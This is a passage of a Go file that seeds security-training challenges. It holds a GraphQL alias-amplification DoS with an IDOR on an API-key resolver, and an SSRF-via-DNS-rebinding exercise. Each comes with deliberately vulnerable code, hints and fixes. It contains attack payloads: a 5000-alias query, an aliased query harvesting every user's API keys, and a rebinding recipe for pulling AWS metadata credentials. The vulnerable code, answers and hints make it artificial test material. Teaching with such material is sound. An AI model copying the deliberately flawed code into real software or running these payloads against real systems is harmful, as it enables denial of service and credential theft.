   User field — invokes db.balances.heavyComputation, which is a
   200-ms aggregation. The resolver does NO memoization, batching,
   or rate limiting per invocation. The schema config (line 41-44)
   declares no validation rules, depth limit, complexity limit, or
   alias limit.

Exploit:
   GraphQL's alias feature lets a client request the same field
   under different names within a single query:

       query Storm {
         a1: accountBalance(userId: "victim")
         a2: accountBalance(userId: "victim")
         a3: accountBalance(userId: "victim")
         ... (5000 aliases)
       }

   Apollo resolves every alias as a SEPARATE call to the resolver.
   One HTTP request → 5000 heavyComputation calls → 16 minutes of
   CPU work and 30 000 database roundtrips per attack request.

   The HTTP rate limit (60/min) is unaffected — the attacker sends
   one request per minute and burns hours of server CPU per minute.
   At 100 concurrent attackers the matching engine starves.

Secondary surface:
   The apiKeys resolver (line 36) is unconditional — it does NOT
   re-check ctx.userId or that the parent User belongs to the
   caller. Combined with aliased user(id: ...) queries, a single
   request can pull every user's API keys in batches:

       query { u1: user(id:"1"){ apiKeys } u2: user(id:"2"){ apiKeys } ... }

   That's a separate IDOR — but the alias amplification is what
   makes it practical at scale.`,
		conceptualFix: `Apply per-resolver and per-query bounds.

1. Add a query-complexity / depth / alias limit to the ApolloServer
   config:

       const depthLimit = require('graphql-depth-limit');
       const costAnalysis = require('graphql-cost-analysis').default;

       new ApolloServer({
         typeDefs, resolvers,
         validationRules: [
           depthLimit(5),
           costAnalysis({ maximumCost: 1000, defaultCost: 1 }),
         ],
         context: ...,
       });

   Annotate expensive fields with explicit cost:

       accountBalance: Float @cost(complexity: 50)

   A query that breaches the budget is rejected at validation time,
   before any resolver runs.

2. Batch within the request via DataLoader. Wrap heavyComputation:

       const balanceLoader = new DataLoader(async (userIds) => {
         return db.balances.heavyComputationBatch(userIds);
       });

       accountBalance: async (_, { userId }) => balanceLoader.load(userId),

   Multiple aliases requesting the same userId resolve in a SINGLE
   batched call.

3. Fix the IDOR on the apiKeys resolver:

       apiKeys: async (user, _, ctx) => {
         if (user.id !== ctx.userId && !ctx.isAdmin) {
           throw new ForbiddenError('not your keys');
         }
         return db.apiKeys.findByUserId(user.id);
       },

4. Defense in depth:
   - Persisted queries: clients ship a query hash; the server
     accepts only pre-registered queries. Eliminates ad-hoc DoS
     surfaces entirely.
   - Per-resolver timeout via a cancellation token in ctx.
   - Alert on requests with > N aliases (where N = 50, say) at the
     GraphQL middleware layer.`,
		hints: []string{
			"What does field aliasing in GraphQL let a client do that is invisible to per-HTTP-request rate limiting?",
			"Look at the accountBalance resolver. Is there any deduplication or batching when the same userId is requested many times in one query?",
			"How would you bound the total work a single GraphQL request can do, independent of how many fields it lists?",
		},
		vulnerableLines: []int{28, 33},
	}
}

// ──────────────────────────────────────────────────
// OSCP 14 — SSRF via DNS rebinding TOCTOU
// Difficulty 8 — Safety check resolves DNS once; the HTTP client
// resolves it again at request time — different answer the second time.
// ──────────────────────────────────────────────────
func oscpPythonSSRFDNSRebinding() challengeSeed {
	return challengeSeed{
		title:        "The Shifting Address — SSRF via DNS Rebinding TOCTOU",
		slug:         "python-ssrf-dns-rebinding-toctou",
		difficulty:   8,
		langSlug:     "python",
		catSlug:      "ssrf",
		points:       600,
		cveReference: "CWE-367 + CWE-918 (TOCTOU on URL host)",
		description: `A Python image-preview service accepts a URL from authenticated
users and renders a thumbnail. It runs on AWS EC2 with the instance
metadata service (IMDSv1) reachable at 169.254.169.254. The team
added an SSRF guard six months ago after a pen test: any URL whose
hostname resolves to a private/loopback/link-local IP is rejected
with a 403.

The guard works against trivial bypasses (raw IP, localhost). The
team is confident the metadata service is unreachable.

Find the bypass that costs the attacker a single DNS record and
~30 seconds of patience.`,
		code: `import socket
import ipaddress
from urllib.parse import urlparse
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)


def is_safe_host(hostname: str) -> bool:
    try:
        infos = socket.getaddrinfo(hostname, None)
    except socket.gaierror:
        return False
    for info in infos:
        ip = ipaddress.ip_address(info[4][0])
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return False
    return True


@app.route("/api/preview", methods=["POST"])
def preview():
    body = request.get_json(force=True)
    url = body.get("url")
    if not url:
        return jsonify({"error": "url required"}), 400

    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return jsonify({"error": "scheme not allowed"}), 400
    if not parsed.hostname:
        return jsonify({"error": "hostname required"}), 400

    if not is_safe_host(parsed.hostname):
        return jsonify({"error": "host blocked"}), 403

    resp = requests.get(url, timeout=10)
    return jsonify({
        "status": resp.status_code,
        "headers": dict(resp.headers),
        "body": resp.text[:10000]
    })`,
		targetVuln: `Classic DNS rebinding TOCTOU between the safety check and the
HTTP fetch.

Flaw — two independent DNS resolutions (lines 35, 38).
   Line 35: is_safe_host(parsed.hostname) calls socket.getaddrinfo,
   which resolves the hostname via the OS resolver. The check then
   asserts that every returned IP is non-private.

   Line 38: requests.get(url, ...) parses the URL again, and the
   underlying urllib3 / http.client resolves the hostname AGAIN to
   open the TCP connection. That's a SEPARATE call to the resolver.

Between the two resolutions the attacker's authoritative DNS server
can return a different IP. The classic recipe:

   1. Register evil.dnsrebinder.example with two A records and a TTL
      of 1 second: 198.51.100.7 (a public IP they own) and
      169.254.169.254 (the AWS metadata service).
   2. The first DNS query — from is_safe_host — returns 198.51.100.7.
      The check passes (public IP, not private).
   3. The attacker's DNS server then begins returning ONLY
      169.254.169.254 for that hostname.
   4. The second DNS query — from requests.get — returns
      169.254.169.254. The HTTP client connects to the metadata
      service. The response contains IAM credentials for the worker's
      EC2 instance.

Why a TTL of 1 second is enough:
   Python's stub resolver and the OS resolver honor short TTLs.
   requests.get does no caching of its own. Between the two
   getaddrinfo calls (microseconds in code), the cached entry has
   already expired and a fresh query goes to the attacker's DNS.

Tools like rbndr.us and Singularity of Origin productize this; an
attacker does not have to operate their own nameserver.`,
		conceptualFix: `Eliminate the two-resolution window. There are three robust
strategies; combine them for defense in depth.

1. Resolve once and connect by IP — pin the address.
       infos = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
       safe_ip = None
       for info in infos:
           ip = ipaddress.ip_address(info[4][0])
           if not (ip.is_private or ip.is_loopback or
                   ip.is_link_local or ip.is_reserved):
               safe_ip = ip
               break
       if not safe_ip:
           return jsonify({"error": "host blocked"}), 403

       # Connect to the verified IP, preserve the Host header for
       # virtual-host routing on the upstream:
       url_to_fetch = url.replace(parsed.hostname, str(safe_ip), 1)
       resp = requests.get(
           url_to_fetch,
           headers={"Host": parsed.hostname},
           timeout=10,
           verify=(parsed.hostname if parsed.scheme == "https" else False),
       )

2. Block the metadata service at the network layer.
       - EC2: enforce IMDSv2 (session-token required) and run instances
         with HttpTokens=required + HttpEndpoint=enabled and the
         hop-limit set to 1. Even if the fetch reaches 169.254.169.254
         the missing token returns 401.
       - GCP: use the GCE metadata Flavor: Google header check.
       - K8s: use a NetworkPolicy or egress firewall to drop traffic
         to 169.254.0.0/16 from workload pods.

3. Use a SSRF-aware HTTP library or proxy.
       - Use the safe-fetch crate equivalent in Python: ssrf-protect,
         python-requests-ssrf, or write a transport adapter that
         resolves once and pins the socket.
       - Front all outbound traffic with an egress proxy that re-checks
         the destination IP after its own resolution.

4. Defense in depth:
   - Drop the SVG previewer's network egress entirely if the use case
     allows. Render thumbnails of user-uploaded images only, never of
     arbitrary URLs.
   - Run the preview worker in a network namespace whose default
     route blocks RFC1918 + 169.254.0.0/16.
   - Log every preview fetch with its resolved IP; alert on any IP
     in 169.254.0.0/16 even if it shouldn't be reachable.`,
		hints: []string{
			"How many times is the hostname resolved during a single preview request?",
			"Could the answer to a DNS query change between two calls to socket.getaddrinfo, one second apart?",
			"What service on a typical AWS EC2 instance answers on the link-local address 169.254.169.254, and why would the attacker want it?",
		},
		vulnerableLines: []int{35, 38},
	}
}

